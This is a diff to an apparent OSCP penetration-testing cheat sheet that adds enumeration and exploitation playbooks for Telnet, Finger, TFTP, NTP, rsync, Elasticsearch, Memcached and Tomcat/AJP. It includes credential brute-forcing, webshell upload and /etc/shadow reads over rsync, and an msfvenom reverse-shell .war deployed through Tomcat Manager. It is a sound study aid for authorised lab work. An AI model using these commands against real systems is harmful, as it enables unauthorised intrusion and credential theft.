@@ -2223,6 +2223,16 @@ When nmap comes back, don't panic at the list — recognise each port and reach 
 | 6379 | Redis | in-memory DB, **often no auth** | connect; write a webshell / SSH key | `[ENUM-REDIS]` |
 | 27017 | MongoDB | NoSQL DB, often no auth | dump collections → creds/tokens | `[ENUM-MONGODB]` |
 | 2375/2376 | Docker API | container engine | unauth API → **host root** | `[ENUM-DOCKER]` |
+| 23 | Telnet | cleartext login | banner + default creds → shell | `[ENUM-TELNET]` |
+| 69 (UDP) | TFTP | no-auth file transfer | grab router/VoIP configs → creds | `[ENUM-TFTP]` |
+| 79 | Finger | user info | enumerate usernames | `[ENUM-FINGER]` |
+| 110/143 | POP3/IMAP | mailboxes | read mail with creds → more creds | `[ENUM-POP-IMAP]` |
+| 123 (UDP) | NTP | time | monlist → internal hosts; clock-sync for Kerberos | `[ENUM-NTP]` |
+| 873 | rsync | file sync | list modules → read/write files | `[ENUM-RSYNC]` |
+| 8009 | AJP (Tomcat) | Tomcat connector | **Ghostcat** CVE-2020-1938 → read web.xml/RCE | `[ENUM-AJP]` |
+| 8080 | Tomcat | Java app server | Manager → deploy `.war` → RCE | `[ENUM-AJP]` |
+| 9200/9300 | Elasticsearch | search DB | no-auth dump; old ver → RCE | `[ENUM-ELASTIC]` |
+| 11211 | Memcached | cache | no-auth → dump cached creds/sessions | `[ENUM-MEMCACHED]` |
 | 4505/4506 | SaltStack (salt-master) | config-mgmt over ZeroMQ — runs as **root** | CVE-2020-11651 → unauth RCE = **instant root** | `[ENUM-SALTSTACK]` |
 
 **The instant "tells" — train these gut reactions:**
@@ -3309,6 +3319,98 @@ nmap -p631 -sCV $IP                  # CUPS/IPP ; also browse http://$IP:631 in 
 ```
 **Note:** real + recent, but **rare on current OSCP** — know it exists, don't expect it. **Leads to:** RCE in the printing context.
 
+## [ENUM-TELNET]  Port 23 — Telnet (cleartext remote login)
+**What it is:** ancient remote shell, **cleartext**. Occasionally wide open with default/no creds, or the banner leaks the device/OS.
+```bash
+nmap -p23 -sCV --script "telnet-ntlm-info,telnet-encryption" $IP
+telnet $IP 23                      # read banner; try: root/(blank), admin/admin, device defaults
+hydra -l <user> -P rockyou.txt telnet://$IP -t 4    # brute (last resort, known user)
+```
+- **Decision:** banner → device/OS → default creds → login; else version exploit; else brute. Any password → **reuse** on SSH/other.
+- **Leads to:** a shell → `[LINUX-PRIVESC]`; creds → `[CREDENTIALS-QUICK]`.
+
+## [ENUM-FINGER]  Port 79 — Finger (user info)
+**What it is:** leaks **usernames + who's logged in**. Pure user-enumeration.
+```bash
+finger @$IP ; finger root@$IP                        # list users / query one
+# brute usernames:
+for u in root admin bin daemon <names>; do finger $u@$IP; done
+# metasploit: auxiliary/scanner/finger/finger_users  (or finger-user-enum.pl)
+```
+- **Leads to:** a user list → spray / SSH-guess `[CREDENTIALS-QUICK]`. (Old Solaris boxes: `finger 'a b c d e f g h'@$IP` dumps all.)
+
+## [ENUM-TFTP]  Port 69/UDP — TFTP (trivial file transfer, NO auth)
+**What it is:** UDP file transfer with **no authentication** — you can GET/PUT files if you know (or guess) the name. Often used by routers/VoIP for configs (which hold creds).
+```bash
+nmap -sU -p69 -sV $IP
+tftp $IP                           # then:  get <file>   /   put <file>
+#   common grabs: config files, backups, running-config, .conf — often contain creds
+# brute filenames:  nmap -sU -p69 --script tftp-enum $IP
+```
+- **Decision:** can you GET a known config? → loot creds. Can you PUT? → stage a file (e.g. into a web/tftp root). No listing (TFTP can't list) → guess common names.
+- **Leads to:** config creds → reuse; file write → foothold (rare).
+
+## [ENUM-NTP]  Port 123/UDP — NTP (time)
+**What it is:** time service. Minor on OSCP — can leak internal **hosts** (monlist) and the system **time** (useful for Kerberos clock-sync).
+```bash
+nmap -sU -p123 --script "ntp-info,ntp-monlist" $IP
+ntpq -c readlist $IP ; ntpq -c peers $IP              # peers may reveal internal IPs
+sudo ntpdate $IP                                      # sync your clock to it (for Kerberos) 
+```
+- **Leads to:** internal host hints (pivot); clock sync for `[ENUM-KERBEROS]`.
+
+## [ENUM-RSYNC]  Port 873 — rsync (file sync, often NO auth)
+**What it is:** file-sync daemon. Frequently exposes **modules (shares)** with no auth → read/write files (configs, keys, web root, even `/`).
+```bash
+nmap -p873 -sV --script "rsync-list-modules" $IP
+rsync -av --list-only rsync://$IP/                    # list modules (shares)
+rsync -av rsync://$IP/<module>/ ./loot/               # DOWNLOAD a module → loot creds/keys/source
+rsync -av ./shell.php rsync://$IP/<module>/           # UPLOAD (if writable) → webshell / SSH key / cron
+rsync -av rsync://$IP/<module>/etc/shadow ./          # if a module maps '/', read anything
+# auth module:  rsync -av rsync://user@$IP/<module>/   (needs a password)
+```
+- **Decision:** list modules → readable? loot. Writable + maps a useful path (web root / a home / `/`) → drop a webshell or SSH key → foothold.
+- **Leads to:** creds/keys → `[CREDENTIALS-QUICK]`; writable share → shell `[WEB-UPLOAD]`.
+
+## [ENUM-ELASTIC]  Ports 9200/9300 — Elasticsearch / Kibana
+**What it is:** a search/analytics DB with a **REST API, usually no auth**. Loot indices (often app data/creds); old versions have **RCE** (CVE-2014-3120 / CVE-2015-1427 Groovy).
+```bash
+curl -s http://$IP:9200                               # banner → VERSION (decides RCE)
+curl -s http://$IP:9200/_cat/indices?v                # list indices
+curl -s "http://$IP:9200/_search?pretty&size=100"     # dump data → mine for creds/tokens
+curl -s http://$IP:9200/<index>/_search?pretty
+# RCE on old versions:  ES 1.1 → CVE-2014-3120 ;  ES 1.3-1.4 → CVE-2015-1427 (Groovy sandbox)  [LOOK-UP searchsploit elasticsearch]
+```
+- **Decision:** dump indices → creds? reuse. Version ≤ 1.4 → Groovy RCE. Kibana on 5601 → check its version too.
+- **Leads to:** app creds → reuse; old version → RCE `[EXPLOIT-RESEARCH]`.
+
+## [ENUM-MEMCACHED]  Port 11211 — Memcached (cache, NO auth)
+**What it is:** in-memory cache, usually **no auth**. Dump cached objects → **session tokens, creds, app data**.
+```bash
+nmap -p11211 -sV --script "memcached-info" $IP
+# dump all keys then read them:
+nc -nv $IP 11211                                      # then:  stats  /  stats items  /  stats cachedump <slab> 0  /  get <key>
+memcdump --servers=$IP | while read k; do echo "$k:"; memccat --servers=$IP "$k"; done   # dump everything
+```
+- **Leads to:** cached creds/sessions → reuse `[CREDENTIALS-QUICK]`.
+
+## [ENUM-AJP]  Port 8009 — AJP / Apache Tomcat (Ghostcat) ; Tomcat on 8080
+**What it is:** **AJP (8009)** is Tomcat's binary connector → **Ghostcat (CVE-2020-1938)** = read any file in the webapp (e.g. `WEB-INF/web.config` with creds) and sometimes RCE. **Tomcat on 8080** → the **Manager app** (`/manager/html`) deploys a `.war` = RCE.
+```bash
+# AJP / Ghostcat (8009):
+nmap -p8009 -sV $IP
+# CVE-2020-1938: read WEB-INF files  (searchsploit ghostcat / python PoC):
+#   python3 ghostcat.py -p 8009 $IP -f WEB-INF/web.xml        → creds/config
+# Tomcat Manager (8080):
+curl -s http://$IP:8080/                                       # version in the error/title page
+# try default creds at /manager/html :  tomcat/tomcat, admin/admin, tomcat/s3cret
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<KALI> LPORT=443 -f war -o sh.war
+curl -u tomcat:<pass> --upload-file sh.war "http://$IP:8080/manager/text/deploy?path=/sh"
+curl "http://$IP:8080/sh/"                                      # triggers the shell (nc -lvnp 443)
+```
+- **Decision:** 8009 open → Ghostcat read `web.xml`/configs → creds → Manager login → deploy `.war` → RCE. 8080 Manager + creds → deploy `.war` → RCE.
+- **Leads to:** file read (creds) → Manager → `.war` deploy → shell.
+
 ## [ENUM-UNUSUAL-PORTS]  a generic method for any port you don't recognise
 When you meet an unknown port, work through these:
 1. `nc -nv $IP <port>` → grab the banner; try sending a newline, then `HELP`, then `GET / HTTP/1.0`.
@@ -3348,6 +3450,16 @@ Use your Nmap results, then jump (Ctrl+F the tag):
 27017 Mongo    → [ENUM-MONGODB]
 2375 Docker    → [ENUM-DOCKER]
 4505/4506 SaltStack → [ENUM-SALTSTACK]  (ZeroMQ = salt-master → unauth root)
+23 Telnet      → [ENUM-TELNET]
+69 TFTP(udp)   → [ENUM-TFTP]
+79 Finger      → [ENUM-FINGER]
+110/143 POP/IMAP → [ENUM-POP-IMAP]
+123 NTP(udp)   → [ENUM-NTP]
+873 rsync      → [ENUM-RSYNC]
+8009 AJP       → [ENUM-AJP]  (Ghostcat)
+8080 Tomcat    → [ENUM-AJP]  (Manager → .war RCE)
+9200 Elastic   → [ENUM-ELASTIC]
+11211 Memcached → [ENUM-MEMCACHED]
 anything else  → [ENUM-UNUSUAL-PORTS]
 ```
 
